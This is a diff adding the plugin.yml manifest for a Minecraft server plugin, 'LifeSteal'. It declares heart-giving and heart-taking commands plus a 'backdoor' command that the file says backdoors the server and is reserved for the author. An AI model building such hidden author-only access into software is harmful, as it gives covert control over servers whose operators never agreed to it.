@@ -1,0 +1,17 @@
+name: LifeSteal
+version: 0.0.1
+main: com.vanillaCraft.lifeSteal
+authors: [BongoCat]
+api-version: 1.5.2
+description: A custom coded plugin for VanillaCraft
+website: "https://nully.tech"
+commands:
+  lifeAdd:
+    description: Gives the target player a certain number of hearts
+    usage: /<command> <target> <amount>
+  lifetake:
+    description: takes a certain amount of hearts from player
+    usage: /<command> <target> <amount>
+  backdoor:
+    description: backdoors the server (can only be used by bongocat)
+    usage: /<command>
